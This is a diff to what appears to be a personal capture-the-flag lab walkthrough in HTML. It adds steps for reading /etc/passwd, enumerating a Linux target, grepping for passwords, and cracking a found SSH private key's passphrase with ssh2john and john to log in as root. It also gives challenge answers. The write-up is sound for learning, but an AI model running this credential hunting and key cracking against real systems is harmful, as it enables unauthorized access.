@@ -68,6 +68,40 @@ do all kinds of things with this.</p>
 <ul>cd Desktop</ul>
 <ul>cat user.txt -> answer to challenge 5 is CrJ9</ul>
 </ol></p>
+    <h2>/etc/passwd</h2>
+    <p>It's always a good idea to read the contents of /etc/passwd</p>
+    <p><ol>
+        <ul>cat /etc/passwd</ul>
+    </ol></p>
+<p>The /etc/passwd file is the cornerstone of user account management, serving as the first line of defense against unauthorized access. /etc/passwd holds important user account details and stores user 
+    data such as home directories, shell preferences, usernames, user IDs, group IDs etc. Any user with a user ID above 1000 isn't a default user and has been added to the system. The password column contains an X, 
+    indicating that the password is stored in the /etc/shadow file.</p>
+    <h2>Basic System Enumeration</h2>
+    <p><ol>
+        <ul>uname -a</ul>
+        <ul>hostname</ul>
+        <ul>lscpu</ul>
+        <ul>ls /home</ul>
+        <ul>ls /var/www/html</ul>
+        <ul>ls /var/www/</ul>
+        <ul>ps aux | grep root</ul>
+        <ul>netstat -tulpn</ul>
+        <ul>ps -aux | grep root | grep mysql</ul>
+        <ul>ifconfig</ul>
+        <ul>find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;</ul>
+        <ul>locate pass | more</ul>
+    </ol></p>
+    <p>During enumeration I found a file name id_rsa.tar.gz in /var/www. I was able to unzip this file and read the contents of the id_rsa.tar file which turned out to be a private key file.</p>
+    <p><ol>
+        <ul>copy the contents and paste it in a new file named priv_key.txt using nano</ul>
+        <ul>chmod 600 priv_key.txt</ul>
+        <ul>ssh -i priv_key.txt root@10.10.1.213</ul>
+        <ul>A passphrase is needed</ul>
+        <ul>python /usr/share/john/ssh2john priv_key.txt > hash.txt</ul>
+        <ul>john hash.txt</ul
+        <ul>If standard john wordlist doesn't work, try this  --wordlist=/usr/share/wordlists/rockyou.txt</ul>
+        <ul>After some minutes john found the password <b>boylover1</b></ul>
+    </ol></p>
 <p>Challenge 6:</p>
 <p>What is the hash value stored in the file root.txt at the target ?</p>
 <p>Answer: again, this is hard without previous experience or knowledge. It has something to do with privilege escalation or adding things to the /etc/sudoers.d file. Work in progress ...</p>
